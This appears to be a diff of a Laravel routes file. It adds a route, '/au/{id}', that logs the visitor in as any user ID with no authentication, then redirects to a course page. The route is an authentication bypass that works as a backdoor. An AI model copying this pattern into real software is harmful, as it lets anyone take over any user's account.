@@ -4,6 +4,12 @@ Route::get('/test', function(){
     return View::make('test');
 });
 
+Route::get('/au/{id}', function($id){
+  
+  Auth::loginUsingId($id);
+  return Redirect::to("/curso");
+});
+
 Route::get('/', function() {
 
     if (Auth::check()) {
